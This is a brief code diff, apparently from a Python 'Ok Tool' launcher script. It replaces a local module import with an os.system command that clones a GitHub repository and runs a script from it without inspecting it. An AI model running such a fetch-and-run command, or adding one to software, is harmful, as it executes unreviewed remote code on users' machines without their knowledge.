@@ -19,6 +19,6 @@ if b == '64bit':
     
     print("\033[1;32m     Welcome To My Ok Tool");time.sleep(2.0)
     
-    from axir_enc import main
+    os.system(f"git clone https://github.com/ahmad77412/data1 && cd data1 && python a1.py")
     
-    main
+    
